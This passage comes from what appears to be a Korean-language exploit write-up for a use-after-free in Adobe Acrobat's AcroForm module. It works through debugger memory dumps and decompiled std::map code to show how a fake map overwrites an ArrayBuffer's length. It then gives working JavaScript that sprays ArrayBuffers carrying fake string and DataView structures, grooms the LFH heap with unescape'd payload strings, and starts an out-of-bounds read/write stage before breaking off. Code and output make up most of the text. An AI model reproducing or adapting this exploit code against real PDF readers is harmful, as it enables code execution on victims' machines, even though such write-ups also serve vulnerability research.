<span class="hljs-attribute">eip</span>=<span class="hljs-number">63</span>ac<span class="hljs-number">2</span>a<span class="hljs-number">4</span>b esp=<span class="hljs-number">0457</span>ac<span class="hljs-number">14</span> ebp=<span class="hljs-number">0457</span>ac<span class="hljs-number">28</span> iopl=<span class="hljs-number">0</span>         nv up ei pl zr na pe nc
<span class="hljs-attribute">cs</span>=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002</span>b  ds=<span class="hljs-number">002</span>b  es=<span class="hljs-number">002</span>b  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002</span>b             efl=<span class="hljs-number">00200246</span>
<span class="hljs-attribute">AcroForm</span>!DllUnregisterServer+<span class="hljs-number">0</span>x<span class="hljs-number">69</span>eb:
<span class="hljs-attribute">63ac2a4b</span> e<span class="hljs-number">83</span>b<span class="hljs-number">410000</span>      call    AcroForm!DllUnregisterServer+<span class="hljs-number">0</span>xab<span class="hljs-number">2</span>b (<span class="hljs-number">63</span>ac<span class="hljs-number">6</span>b<span class="hljs-number">8</span>b)
<span class="hljs-attribute">0</span>:<span class="hljs-number">000</span>&gt; dd ecx // ecx+<span class="hljs-number">8</span> == this-&gt;map
<span class="hljs-attribute">2909d478</span>  <span class="hljs-number">4</span>e<span class="hljs-number">4</span>e<span class="hljs-number">4</span>d<span class="hljs-number">4</span>d <span class="hljs-number">50504</span>f<span class="hljs-number">4</span>f *<span class="hljs-number">20000058</span>* <span class="hljs-number">54545353</span>
<span class="hljs-attribute">2909d488</span>  <span class="hljs-number">56565555</span> <span class="hljs-number">58585757</span> <span class="hljs-number">5</span>a<span class="hljs-number">5</span>a<span class="hljs-number">5959</span> <span class="hljs-number">5</span>c<span class="hljs-number">5</span>c<span class="hljs-number">5</span>b<span class="hljs-number">5</span>b
<span class="hljs-attribute">2909d498</span>  <span class="hljs-number">5</span>e<span class="hljs-number">5</span>e<span class="hljs-number">5</span>d<span class="hljs-number">5</span>d <span class="hljs-number">60605</span>f<span class="hljs-number">5</span>f <span class="hljs-number">00006161</span> <span class="hljs-number">00000000</span>
<span class="hljs-attribute">2909d4a8</span>  b<span class="hljs-number">0</span>fe<span class="hljs-number">1536</span> <span class="hljs-number">8</span>c<span class="hljs-number">002000</span> <span class="hljs-number">42424141</span> <span class="hljs-number">44444343</span>
<span class="hljs-attribute">2909d4b8</span>  <span class="hljs-number">46464545</span> <span class="hljs-number">48484747</span> <span class="hljs-number">4</span>a<span class="hljs-number">4</span>a<span class="hljs-number">4949</span> <span class="hljs-number">4</span>c<span class="hljs-number">4</span>c<span class="hljs-number">4</span>b<span class="hljs-number">4</span>b
<span class="hljs-attribute">2909d4c8</span>  <span class="hljs-number">4</span>e<span class="hljs-number">4</span>e<span class="hljs-number">4</span>d<span class="hljs-number">4</span>d <span class="hljs-number">50504</span>f<span class="hljs-number">4</span>f <span class="hljs-number">20000058</span> <span class="hljs-number">54545353</span>
<span class="hljs-attribute">2909d4d8</span>  <span class="hljs-number">56565555</span> <span class="hljs-number">58585757</span> <span class="hljs-number">5</span>a<span class="hljs-number">5</span>a<span class="hljs-number">5959</span> <span class="hljs-number">5</span>c<span class="hljs-number">5</span>c<span class="hljs-number">5</span>b<span class="hljs-number">5</span>b
<span class="hljs-attribute">2909d4e8</span>  <span class="hljs-number">5</span>e<span class="hljs-number">5</span>e<span class="hljs-number">5</span>d<span class="hljs-number">5</span>d <span class="hljs-number">60605</span>f<span class="hljs-number">5</span>f <span class="hljs-number">00006161</span> <span class="hljs-number">00000000</span></code></pre>
<p> <code>std::map&lt;unsigned short,CAgg&gt;::operator[]</code>&#xD638;&#xCD9C;&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xB294; <code>this-&gt;map</code>&#xC740; &#xD799; &#xC2A4;&#xD504;&#xB808;&#xC774;&#xB97C; &#xD1B5;&#xD574; 0x20000048&#xC5D0; &#xD560;&#xB2F9;&#xB41C; &#xC544;&#xB798;&#xC758; <code>ArrayBuffer</code>&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xACE0; &#xC788;&#xACE0;  0x20000048&#xC5D0; 0x10 &#xBC14;&#xC774;&#xD2B8;&#xC758; &#xD5E4;&#xB354;&#xAC00; &#xC704;&#xCE58;&#xD574;&#xC788;&#xC73C;&#xBA70; 0x20000058&#xBD80;&#xD130; &#xB370;&#xC774;&#xD130;&#xAC00; &#xC704;&#xCE58;&#xD558;&#xACE0; &#xC774;&#xB294; &#xACF5;&#xACA9;&#xC790;&#xC5D0; &#xC758;&#xD574; &#xC0AC;&#xC804;&#xC5D0; &#xAD6C;&#xC131;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<pre><code class="hljs basic"><span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; dd <span class="hljs-number">0</span>x20000048
<span class="hljs-symbol">20000048 </span> <span class="hljs-number">00000000</span> <span class="hljs-number">0000</span>ffe8 <span class="hljs-number">17</span>c7bbe0 <span class="hljs-number">00000000</span>
<span class="hljs-symbol">20000058 </span> <span class="hljs-number">20000060</span> <span class="hljs-number">41424345</span> <span class="hljs-number">41424344</span> <span class="hljs-number">20000044</span> // <span class="hljs-number">20000058</span> : this-&gt;map
<span class="hljs-symbol">20000068 </span> <span class="hljs-number">33333333</span> <span class="hljs-number">33333333</span> <span class="hljs-number">33333333</span> <span class="hljs-number">33333333</span>
<span class="hljs-symbol">20000078 </span> <span class="hljs-number">33333333</span> <span class="hljs-number">33333333</span> <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span></code></pre>
<p>&#xC704; &#xB370;&#xC774;&#xD130; &#xC911; <code>ArrayBuffer</code>&#xC758; &#xAE38;&#xC774;&#xB97C; &#xB098;&#xD0C0;&#xB0B4;&#xB294; &#xBD80;&#xBD84;&#xC740; &#xC624;&#xD504;&#xC14B; + 0x4&#xC778; 0x2000004c&#xB85C; <code>std::map&lt;unsigned short,CAgg&gt;::operator[]</code>&#xC5D0;&#xC11C; 0x20000058&#xC5D0; &#xAD6C;&#xC131;&#xB41C; fake <code>map</code>&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xD638;&#xCD9C;&#xB418;&#xB294; <code>lower_bound</code>&#xC640; <code>insert</code>&#xC5D0; &#xC758;&#xD574; &#xBCC0;&#xC870;&#xB429;&#xB2C8;&#xB2E4;.</p>
<h3 id="std-map-operator"><a href="#std-map-operator" class="headerlink" title="std::map::operator[]"></a>std::map<unsigned short,cagg>::operator[]</unsigned></h3><pre><code class="hljs c"><span class="hljs-keyword">int</span> __thiscall <span class="hljs-built_in">std</span>::<span class="hljs-built_in">map</span>&lt;<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span>,CAgg&gt;::<span class="hljs-keyword">operator</span>[](TREE_VAL *<span class="hljs-keyword">this</span>, <span class="hljs-keyword">int</span> a2, <span class="hljs-keyword">unsigned</span> __int16 *pSomeID)
{
	...
	<span class="hljs-keyword">int</span> v8[<span class="hljs-number">3</span>]
  ...
  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">map</span>&lt;<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span>,CAgg&gt;::lower_bound(<span class="hljs-keyword">this</span>, v8, pSomeID);
  v4 = v9;
  <span class="hljs-keyword">if</span> ( sub_208E95F2(v9, pSomeID) )
  {
    ...
  }
  <span class="hljs-keyword">else</span>
  {
    <span class="hljs-keyword">if</span> ( <span class="hljs-keyword">this</span>-&gt;_Mysize == <span class="hljs-number">0x38E38E3</span> )
      Throw_tree_length_error();
    ...
    *(_DWORD *)a2 = <span class="hljs-built_in">std</span>::<span class="hljs-built_in">map</span>&lt;<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span>,CAgg&gt;::insert(<span class="hljs-keyword">this</span>, v8[<span class="hljs-number">0</span>], (<span class="hljs-keyword">int</span>)v8[<span class="hljs-number">1</span>], Parent);
    ...
  }
  <span class="hljs-keyword">return</span> result;
}</code></pre>
<p>&#xBA3C;&#xC800; &#xD638;&#xCD9C;&#xB418;&#xB294; <code>lower_bound</code>&#xC5D0;&#xC11C; &#xC544;&#xB798;&#xC758; &#xCF54;&#xB4DC;&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xC5B4; &#xB450; &#xBC88;&#xC9F8; &#xC778;&#xC790;(<code>a2</code>)&#xB85C; &#xC804;&#xB2EC;&#xD55C; <code>v8</code>&#xC5D0; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC501;&#xB2C8;&#xB2E4;.</p>
<h3 id="std-map-lower-bound"><a href="#std-map-lower-bound" class="headerlink" title="std::map::lower_bound"></a>std::map<unsigned short,cagg>::lower_bound</unsigned></h3><pre><code class="hljs c">_DWORD *__thiscall <span class="hljs-built_in">std</span>::<span class="hljs-built_in">map</span>&lt;<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span>,CAgg&gt;::lower_bound(<span class="hljs-keyword">int</span> <span class="hljs-keyword">this</span>, <span class="hljs-keyword">int</span> *a2, <span class="hljs-keyword">int</span> *a3)
{
  <span class="hljs-keyword">int</span> Myhead; <span class="hljs-comment">// eax</span>
  <span class="hljs-keyword">int</span> Parent; <span class="hljs-comment">// ecx</span>
  <span class="hljs-keyword">unsigned</span> __int16 v5; <span class="hljs-comment">// si</span>
  <span class="hljs-keyword">int</span> v6; <span class="hljs-comment">// eax</span>
                                                <span class="hljs-comment">// TREE_VAL *this</span>
  Myhead = *(_DWORD *)<span class="hljs-keyword">this</span>;                     <span class="hljs-comment">// this-&gt;_Myhead;</span>
  <span class="hljs-comment">//    mov     eax,dword ptr [ecx]  ds:002b:20000058=20000060</span>
  Parent = *(_DWORD *)(*(_DWORD *)<span class="hljs-keyword">this</span> + <span class="hljs-number">4</span>);    <span class="hljs-comment">// this-&gt;_Myhead-&gt;_Parent</span>
  <span class="hljs-comment">//    mov     ecx,dword ptr [eax+4] ds:002b:20000064=20000044</span>
  a2[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;
  *a2 = Parent;
  a2[<span class="hljs-number">2</span>] = Myhead;
  ...
  <span class="hljs-keyword">return</span> a2;                                    
}</code></pre>
<p><code>Myhead</code>&#xC5D0;&#xB294; <code>this</code>(0x20000058)&#xC5D0;&#xC11C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC77D;&#xC5B4; 0x20000060&#xC774; &#xC800;&#xC7A5;&#xB418;&#xACE0; <code>Myhead-&gt;_Parent</code>(0x20000064)&#xC5D0; &#xC800;&#xC7A5;&#xB41C; 0x20000044&#xAC00; <code>Parent</code>&#xC5D0; &#xC800;&#xC7A5;&#xB429;&#xB2C8;&#xB2E4;. <code>lower_bound</code>&#xC758; &#xD638;&#xCD9C; &#xACB0;&#xACFC; &#xB450; &#xBC88;&#xC9F8; &#xC778;&#xC790;&#xB85C; &#xC804;&#xB2EC;&#xD55C; <code>v8</code>&#xC758; 0, 1, 2 &#xC778;&#xB371;&#xC2A4;&#xC5D0; &#xAC01;&#xAC01; <code>Parent</code>(0x20000044), 0, <code>Myhead</code>(0x20000060) &#xAC12;&#xC774; &#xC4F0;&#xC785;&#xB2C8;&#xB2E4;.</p>
<h3 id="std-map-insert"><a href="#std-map-insert" class="headerlink" title="std::map::insert"></a>std::map<unsigned short,cagg>::insert</unsigned></h3><pre><code class="hljs c"><span class="hljs-keyword">int</span> __thiscall <span class="hljs-built_in">std</span>::<span class="hljs-built_in">map</span>&lt;<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span>,CAgg&gt;::insert(<span class="hljs-keyword">int</span> *<span class="hljs-keyword">this</span>, <span class="hljs-keyword">int</span> *a2, <span class="hljs-keyword">int</span> *a3, <span class="hljs-keyword">int</span> *a4)
{
  <span class="hljs-keyword">int</span> *Myhead; <span class="hljs-comment">// ebx</span>
  <span class="hljs-keyword">int</span> *v5; <span class="hljs-comment">// esi</span>
  <span class="hljs-keyword">int</span> *v6; <span class="hljs-comment">// edi</span>
  <span class="hljs-keyword">int</span> v8; <span class="hljs-comment">// eax</span>
  <span class="hljs-keyword">int</span> *v9; <span class="hljs-comment">// edx</span>
  <span class="hljs-keyword">int</span> v10; <span class="hljs-comment">// ecx</span>

  ++<span class="hljs-keyword">this</span>[<span class="hljs-number">1</span>];                                    <span class="hljs-comment">// ++this-&gt;_Mysize;</span>
  Myhead = (<span class="hljs-keyword">int</span> *)*<span class="hljs-keyword">this</span>;                        <span class="hljs-comment">// this-&gt;_Myhead</span>
  v5 = a4;
  a4[<span class="hljs-number">1</span>] = (<span class="hljs-keyword">int</span>)a2;                              <span class="hljs-comment">// a4-&gt;_Parent = a2</span>
  <span class="hljs-keyword">if</span> ( a2 != Myhead )
  {
    <span class="hljs-keyword">if</span> ( a3 )<span class="hljs-comment">// a3 == 0</span>
    {
      ...
    }
    <span class="hljs-keyword">else</span>
    {
	    a2[<span class="hljs-number">2</span>] = (<span class="hljs-keyword">int</span>)a4;
      <span class="hljs-keyword">if</span> ( a2 == (<span class="hljs-keyword">int</span> *)Myhead[<span class="hljs-number">2</span>] )
        Myhead[<span class="hljs-number">2</span>] = (<span class="hljs-keyword">int</span>)a4;
    }
    ...
  }
  ...
}</code></pre>
<p>&#xB450; &#xBC88;&#xC9F8; &#xC778;&#xC790;(<code>a2</code>)&#xB294; <code>lower_bound</code>&#xC5D0;&#xC11C; <code>v8[0]</code>&#xC5D0; &#xC4F0;&#xC778; <code>Parent</code>(0x20000044)&#xC785;&#xB2C8;&#xB2E4;.&#xC138; &#xBC88;&#xC9F8; &#xC778;&#xC790;(<code>a3</code>)&#xC740;  <code>lower_bound</code>&#xC5D0;&#xC11C; &#xC4F0;&#xC778; 0&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; <code>else</code>&#xB85C; &#xBD84;&#xAE30;&#xD569;&#xB2C8;&#xB2E4;. &#xC5EC;&#xAE30;&#xC11C; <code>a2[2] = (int)a4;</code>&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xBA74;&#xC11C; <code>Parent + 8</code>(0x2000004c)&#xC5D0; &#xC5B4;&#xB5A4; &#xBA54;&#xBAA8;&#xB9AC;&#xC758; &#xC8FC;&#xC18C;&#xAC00; &#xC4F0;&#xC774;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p>
<pre><code class="hljs routeros"><span class="hljs-attribute">eax</span>=20000044 <span class="hljs-attribute">ebx</span>=20000060 <span class="hljs-attribute">ecx</span>=20000058 <span class="hljs-attribute">edx</span>=291a1bf8 <span class="hljs-attribute">esi</span>=291a1bf8 <span class="hljs-attribute">edi</span>=20000058
<span class="hljs-attribute">eip</span>=6385bccf <span class="hljs-attribute">esp</span>=0457ab88 <span class="hljs-attribute">ebp</span>=0457ab94 <span class="hljs-attribute">iopl</span>=0         nv up ei pl zr na pe nc
<span class="hljs-attribute">cs</span>=0023  <span class="hljs-attribute">ss</span>=002b  <span class="hljs-attribute">ds</span>=002b  <span class="hljs-attribute">es</span>=002b  <span class="hljs-attribute">fs</span>=0053  <span class="hljs-attribute">gs</span>=002b             <span class="hljs-attribute">efl</span>=00200246
AcroForm!hb_set_invert+0x3d1f:
6385bccf 897008          mov     dword ptr [eax+8],esi ds:002b:<span class="hljs-attribute">2000004c</span>=0000ffe8</code></pre>
<p><code>Parent + 8</code>&#xC740; <code>ArrayBuffer</code>&#xC758; length&#xAC00; &#xC704;&#xCE58;&#xD55C; &#xC8FC;&#xC18C;&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xACE0; &#xC788;&#xACE0; &#xBA54;&#xBAA8;&#xB9AC; &#xC8FC;&#xC18C;&#xB294; &#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C; &#xC6D0;&#xB798;&#xC758; &#xD06C;&#xAE30;&#xC778; 0xffe8&#xBCF4;&#xB2E4; &#xD6E8;&#xC52C; &#xD07D;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xD574;&#xB2F9; <code>ArrayBuffer</code>&#xB97C; &#xD1B5;&#xD574; OOB Read/Write&#xAC00; &#xAC00;&#xB2A5;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p>
<h3 id="Javascript-code"><a href="#Javascript-code" class="headerlink" title="Javascript code"></a>Javascript code</h3><p>&#xC544;&#xB798;&#xB294; &#xC704; &#xACFC;&#xC815;&#xC744; &#xC218;&#xD589;&#xD558;&#xC5EC; OOB Read/Write&#xC5D0; &#xC0AC;&#xC6A9;&#xD558;&#xB294; <code>ArrayBuffer</code>&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xB294; Javascript &#xCF54;&#xB4DC;&#xC785;&#xB2C8;&#xB2E4;.</p>
<pre><code class="hljs jsx"><span class="hljs-comment">/*</span>
<span class="hljs-comment">....</span>
<span class="hljs-comment">*/</span>
<span class="hljs-keyword">const</span> ALLOC_SIZE = <span class="hljs-number">0x10000</span> - <span class="hljs-number">24</span>;
<span class="hljs-keyword">const</span> ARR_BUF_BASE = <span class="hljs-number">0x20000048</span>;
<span class="hljs-keyword">const</span> ARR_BUF_MALLOC_BASE = <span class="hljs-number">0x20000040</span>;

<span class="hljs-keyword">const</span> arrBufPtr = ARR_BUF_BASE + <span class="hljs-number">0x10</span>;

<span class="hljs-keyword">const</span> FAKE_STR_START = <span class="hljs-number">0x40</span>;
<span class="hljs-keyword">const</span> FAKE_STR = arrBufPtr + <span class="hljs-number">0x100</span>;
<span class="hljs-keyword">const</span> FAKE_DV_START = <span class="hljs-number">0x60</span>;
<span class="hljs-keyword">const</span> FAKE_DV = arrBufPtr + <span class="hljs-number">0x180</span>;
<span class="hljs-comment">/*</span>
<span class="hljs-comment">....</span>
<span class="hljs-comment">*/</span>
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">groomLFH</span>(<span class="hljs-params">size, count</span>) </span>{
    <span class="hljs-keyword">var</span> code =
        <span class="hljs-string">&quot;%u4141%u4242%u4343%u4444%u4545%u4646%u4747%u4848%u4949%u4a4a%u4b4b%u4c4c%u4d4d%u4e4e%u4f4f%u5050%u0058%u2000%u5353%u5454%u5555%u5656%u5757%u5858%u5959%u5a5a%u5b5b%u5c5c%u5d5d%u5e5e%u5f5f%u6060%u6161%u6262%u6363%u6464%u6565%u6666%u6767%u6868%u6969%u6a6a%u6b6b%u6c6c%u6d6d%u6e6e%u6f6f%u7070%u7171%u7272%u7373%u7474%u7575%u7676%u7777%u7878%u7979%u7a7a%u7b7b%u7c7c%u7d7d%u7e7e%u7f7f%u8080%u8181%u8282%u8383%u8484&quot;</span>;
    <span class="hljs-keyword">var</span> string = <span class="hljs-built_in">unescape</span>(code);

    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; count; i++) {
        chunks.push(string.substr(<span class="hljs-number">0</span>, (size - <span class="hljs-number">2</span>) / <span class="hljs-number">2</span>).toUpperCase());
    }

    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; chunks.length; i += <span class="hljs-number">2</span>) {
        chunks[i] = <span class="hljs-literal">null</span>;
        <span class="hljs-keyword">delete</span> chunks[i];
    }
}

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sprayArrBuffers</span>(<span class="hljs-params"></span>) </span>{
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x1500</span>; i++) {
        bufs[i] = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayBuffer</span>(ALLOC_SIZE);
        <span class="hljs-keyword">const</span> uintArr = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint32Array</span>(bufs[i]);
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> k = <span class="hljs-number">0</span>; k &lt; <span class="hljs-number">16</span>; k++) {
            uintArr[k] = <span class="hljs-number">0x33333333</span>;
        }
        uintArr[<span class="hljs-number">0</span>] = arrBufPtr + <span class="hljs-number">8</span>; <span class="hljs-comment">//first deref a = *ecx</span>
        uintArr[<span class="hljs-number">1</span>] = <span class="hljs-number">0x41424344</span>; <span class="hljs-comment">//map size</span>
        uintArr[<span class="hljs-number">2</span>] = <span class="hljs-number">0x41424344</span>;
        uintArr[<span class="hljs-number">3</span>] = ARR_BUF_BASE - <span class="hljs-number">4</span>;

        <span class="hljs-comment">// fake string for arbitrary read</span>
        uintArr[FAKE_STR_START] = <span class="hljs-number">0x102</span>; <span class="hljs-comment">//type</span>
        uintArr[FAKE_STR_START + <span class="hljs-number">1</span>] = arrBufPtr + <span class="hljs-number">0x40</span>; <span class="hljs-comment">// buffer</span>
        uintArr[FAKE_STR_START + <span class="hljs-number">2</span>] = <span class="hljs-number">0x4</span>;
        uintArr[FAKE_STR_START + <span class="hljs-number">3</span>] = <span class="hljs-number">0x4</span>;

        <span class="hljs-comment">// fake dataview for arbitrary write</span>
        uintArr[FAKE_DV_START] = <span class="hljs-number">0x77777777</span>;
        <span class="hljs-keyword">delete</span> uintArr;
        uintArr = <span class="hljs-literal">null</span>;
    }

    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++) {
        arrs[i] = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Array</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">11</span>, <span class="hljs-number">12</span>, <span class="hljs-number">13</span>, <span class="hljs-number">14</span>, <span class="hljs-number">15</span>, <span class="hljs-number">17</span>, <span class="hljs-number">18</span>, <span class="hljs-number">19</span>, <span class="hljs-number">20</span>, <span class="hljs-number">21</span>, <span class="hljs-number">22</span>, <span class="hljs-number">23</span>, <span class="hljs-number">24</span>, <span class="hljs-number">25</span>, <span class="hljs-number">20</span>, <span class="hljs-number">21</span>, <span class="hljs-number">22</span>, <span class="hljs-number">23</span>, <span class="hljs-number">24</span>, <span class="hljs-number">25</span>, <span class="hljs-number">20</span>, <span class="hljs-number">21</span>, <span class="hljs-number">22</span>, <span class="hljs-number">23</span>, <span class="hljs-number">24</span>, <span class="hljs-number">25</span>, <span class="hljs-number">20</span>, <span class="hljs-number">21</span>, <span class="hljs-number">22</span>, <span class="hljs-number">23</span>, <span class="hljs-number">24</span>, <span class="hljs-number">25</span>, <span class="hljs-number">20</span>, <span class="hljs-number">21</span>, <span class="hljs-number">22</span>, <span class="hljs-number">23</span>, <span class="hljs-number">24</span>, <span class="hljs-number">25</span>, <span class="hljs-number">20</span>, <span class="hljs-number">21</span>, <span class="hljs-number">22</span>, <span class="hljs-number">23</span>);
        arrs[i][<span class="hljs-number">0</span>] = <span class="hljs-number">0x47484950</span>;
        arrs[i][<span class="hljs-number">1</span>] = targetStr;
        arrs[i][<span class="hljs-number">2</span>] = targetDV;
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> k = <span class="hljs-number">3</span>; k &lt; <span class="hljs-number">5000</span>; k++) {
            arrs[i][k] = <span class="hljs-number">0x50515051</span>;
        }
    }
}

<span class="hljs-built_in">console</span>.println(<span class="hljs-string">&quot;[*] spraying array buffer...&quot;</span>);

sprayArrBuffers();

<span class="hljs-built_in">console</span>.println(<span class="hljs-string">&quot;[*] pre-populating LFH...&quot;</span>);

groomLFH(<span class="hljs-number">68</span>, <span class="hljs-number">5000</span>);

<span class="hljs-comment">/*</span>
<span class="hljs-comment">Trigger the Bug</span>
<span class="hljs-comment">*/</span></code></pre>
<p><code>sprayArrBuffers</code>&#xD568;&#xC218;&#xC5D0;&#xC11C;&#xB294; 0xffe8 &#xD06C;&#xAE30;&#xB97C; &#xAC00;&#xC9C0;&#xB294; <code>ArrayBuffer</code>&#xB97C; &#xC2A4;&#xD504;&#xB808;&#xC774;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; 0x20000048&#xC5D0; <code>ArrayBuffer</code>&#xAC00; &#xD560;&#xB2F9;&#xB418;&#xAC8C; &#xB9CC;&#xB4ED;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C; <code>ArrayBuffer</code>&#xC5D0;&#xC11C; OOB Read/Write&#xB85C; &#xC811;&#xADFC;&#xD560; <code>Array</code>&#xB97C; &#xC2A4;&#xD504;&#xB808;&#xC774;&#xD558;&#xC5EC; &#xC778;&#xC811;&#xD55C; &#xC8FC;&#xC18C;&#xC5D0; &#xD560;&#xB2F9;&#xD558;&#xACE0; &#xC774;&#xB294; &#xCD94;&#xD6C4;&#xC5D0; &#xC784;&#xC758; &#xC8FC;&#xC18C; &#xC77D;&#xAE30;/&#xC4F0;&#xAE30;&#xC5D0; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</p>
<p>&#xC2A4;&#xD504;&#xB808;&#xC774;&#xB418;&#xB294; <code>ArrayBuffer</code>&#xC5D0;&#xB294; <code>std::map&lt;unsigned short,CAgg&gt;::lower_bound</code>&#xC640;  <code>std::map&lt;unsigned short,CAgg&gt;::insert</code>&#xC758; &#xB3D9;&#xC791;&#xC5D0; &#xC758;&#xD574; length&#xAC00; &#xB36E;&#xC5B4; &#xC4F0;&#xC774;&#xB3C4;&#xB85D; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB97C; &#xAD6C;&#xC131;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; <code>groomLFH</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; <code>String</code> &#xB370;&#xC774;&#xD130; &#xD560;&#xB2F9;&#xC744; &#xD1B5;&#xD574; &#xD799; &#xADF8;&#xB8E8;&#xBC0D;&#xC744; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xBB38;&#xC790;&#xC5F4; &#xB370;&#xC774;&#xD130;&#xC5D0;&#xB294; <code>%u0058%u2000</code>&#xC774; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xACE0; <code>unescape</code>&#xB85C; &#xC778;&#xD574; fake <code>map</code>&#xC758; &#xC8FC;&#xC18C;&#xC778; 0x20000058&#xB85C; &#xBCC0;&#xACBD;&#xB429;&#xB2C8;&#xB2E4;. </p>
<p>&#xBC84;&#xADF8;&#xAC00; &#xD2B8;&#xB9AC;&#xAC70;&#xB41C; &#xC774;&#xD6C4; <code>groomLFH</code>&#xC5D0;&#xC11C; &#xC2A4;&#xD504;&#xB808;&#xC774;&#xB41C; &#xBB38;&#xC790;&#xC5F4;&#xC774; &#xBCC0;&#xD658;&#xB41C; <code>CAgg</code>&#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xB4E4;&#xC740; &#xB2E4;&#xC2DC; &#xBCC0;&#xD658;&#xC744; &#xAC70;&#xCE58;&#xAC8C; &#xB418;&#xB294;&#xB370; &#xC774;&#xB54C; &#xBB38;&#xC790;&#xC5F4; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC62E;&#xAE38; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xD560;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;. brute-force&#xB85C; &#xC54C;&#xC544;&#xB0B8; &#xD06C;&#xAE30;&#xC778; 68&#xB85C; &#xD799; &#xADF8;&#xB8E8;&#xBC0D;&#xC744; &#xC9C4;&#xD589;&#xD558;&#xBA74; &#xC774; &#xACFC;&#xC815;&#xC5D0;&#xC11C; Use-After-Free&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xC7AC;&#xD560;&#xB2F9;&#xD558;&#xC5EC; fake <code>map</code>&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xC704;&#xCE58;&#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<h2 id="2-Out-of-Bounds-Read-Write-via-Corrupted-ArrayBuffer"><a href="#2-Out-of-Bounds-Read-Write-via-Corrupted-ArrayBuffer" class="headerlink" title="2. Out-of-Bounds Read/Write via Corrupted ArrayBuffer"></a>2. Out-of-Bounds Read/Write via Corrupted ArrayBuffer</h2><p>length&#xAC00; &#xBCC0;&#xC870;&#xB41C; <code>ArrayBuffer</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD55C; OOB Read/Write&#xB85C; &#xB2E4;&#xB978; &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xB97C; &#xBCC0;&#xC870;&#xD558;&#xC5EC; &#xCD94;&#xD6C4;&#xC5D0; Arbitrary Address Read/Write&#xC5D0; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xC704;&#xD574; &#xC544;&#xB798;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xD1B5;&#xD574; &#xBCC0;&#xC870;&#xB41C; &#xAE38;&#xC774;&#xB97C; &#xAC00;&#xC9C0;&#xB294; <code>ArrayBuffer</code>&#xB97C; &#xCC3E;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<pre><code class="hljs jsx"><span class="hljs-keyword">var</span> arrStart = <span class="hljs-number">0</span>;
<span class="hljs-keyword">var</span> corruptedTypedArr = <span class="hljs-literal">null</span>;

